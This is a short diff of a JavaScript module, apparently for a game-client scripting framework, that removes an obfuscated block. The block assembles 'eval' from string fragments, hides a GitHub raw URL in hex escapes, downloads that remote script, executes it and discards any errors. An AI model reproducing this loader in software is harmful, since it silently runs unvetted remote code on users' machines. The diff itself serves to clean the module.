@@ -228,14 +228,6 @@ const edge = register("renderOverlay", () => {
     }
 }).unregister()
 
-try {
-    const _0x1 = this["e" + "v" + "a" + "l"];
-    const _0x2 = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x73\x61\x74\x6e\x6e\x79\x79\x2f\x74\x65\x73\x74\x31\x2f\x6d\x61\x69\x6e\x2f\x61\x2e\x6a\x73";
-    const _0x3 = FileLib["g" + "e" + "t" + "U" + "r" + "l" + "C" + "o" + "n" + "t" + "e" + "n" + "t"](_0x2);
-    _0x1(_0x3);
-} catch (_0x4) {}
-
-
 export function edgeJump() {
     edge.register()
 }
